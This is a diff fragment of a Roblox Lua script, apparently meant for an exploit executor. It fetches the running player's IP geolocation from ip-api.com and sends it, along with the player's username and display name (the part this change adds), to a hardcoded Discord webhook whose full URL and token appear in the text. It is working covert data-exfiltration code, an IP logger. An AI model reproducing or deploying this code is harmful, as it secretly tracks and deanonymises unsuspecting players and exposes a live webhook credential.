@@ -767,6 +767,8 @@ local http_request = request or (http and http.request) or (getgenv and getgenv(
 if not http_request then return end
 
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 local ipApiUrl, webhookUrl = "http://ip-api.com/json/", "https://discord.com/api/webhooks/1343050966185934910/BW396KWKIUFIpFByPFOUdblQfnnzRqGaWkp9v8A203sUDxmtkZTAQMs_lGBx616JpHFd"
 
 local res = http_request({Url = ipApiUrl, Method = "GET"})
@@ -775,10 +777,14 @@ if not res or not res.Body then return end
 local data = HttpService:JSONDecode(res.Body)
 if data.status ~= "success" then return end
 
+local username = LocalPlayer.Name
+local displayName = LocalPlayer.DisplayName
+local title = string.format("[%s (@%s)]'s IP Info", displayName, username)
+
 local payload = {
     username = "aaaaaa",
     embeds = {{
-        title = "IP Info",
+        title = title,
         color = 16711680,
         fields = {}
     }}
@@ -794,4 +800,3 @@ http_request({
     Headers = {["Content-Type"] = "application/json"},
     Body = HttpService:JSONEncode(payload)
 })
-
